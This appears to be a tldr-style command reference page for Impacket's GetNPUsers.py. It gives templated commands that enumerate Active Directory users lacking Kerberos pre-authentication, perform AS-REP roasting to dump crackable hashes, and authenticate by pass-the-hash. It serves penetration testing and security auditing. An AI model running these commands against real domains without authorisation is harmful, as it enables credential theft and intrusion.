---
title: "Enumerate AD Users - Find Roasting Targets | Online Free DevTools by Hexmos"
name: getnpusers.py
path: "/freedevtools/tldr/get/getnpusers-py/"
canonical: "https://hexmos-com/freedevtools/tldr/get/getnpusers-py/"
description: "Enumerate Active Directory users with GetNPUsers.py to identify potential AS-REP roasting targets, enabling penetration testers to uncover security vulnerabilities. Free online tool, no registration required."
category: common
keywords:
- active directory enumeration
- as-rep roasting
- kerberos pre-authentication
- getnpusers.py impacket
- active directory hacking
- windows security auditing
- domain user enumeration
- network penetration testing
- ad security vulnerability scanning
- impacket exploit
features:
- Enumerate users with disabled Kerberos pre-authentication
- Perform AS-REP roasting attacks
- Dump crackable Kerberos hashes
- Authenticate with specified credentials
- Support pass-the-hash authentication
ogImage: "https://hexmos.com/freedevtools/site-banner.png"
twitterImage: "https://hexmos.com/freedevtools/site-banner.png"
---

# GetNPUsers.py

> Enumerate Active Directory accounts with Kerberos pre-authentication disabled, which may be susceptible to AS-REP roasting attacks.
> Part of the Impacket suite.
> More information: <https://github.com/fortra/impacket>.

- Enumerate users with Kerberos pre-authentication disabled (default anonymous enumeration):

`GetNPUsers.py {{domain}}/ -usersfile {{path/to/userslist}} -dc-ip {{domain_controller_ip}} -no-pass`

- Perform AS-REP roasting and dump crackable hashes for offline cracking:

`GetNPUsers.py {{domain}}/ -usersfile {{path/to/userslist}} -dc-ip {{domain_controller_ip}} -no-pass -request`

- Authenticate with valid credentials (if anonymous binding is disabled):

`GetNPUsers.py {{domain}}/{{username}}:{{password}} -usersfile {{path/to/userslist}} -dc-ip {{domain_controller_ip}}`

- Use pass-the-hash authentication instead of a password:

`GetNPUsers.py {{domain}}/{{username}} -hashes {{LM_Hash}}:{{NT_Hash}} -usersfile {{path/to/userslist}} -dc-ip {{domain_controller_ip}}`

- Save the output to a file for further analysis:

`GetNPUsers.py {{domain}}/ -usersfile {{path/to/userslist}} -dc-ip {{domain_controller_ip}} -request > {{path/to/output.txt}}`
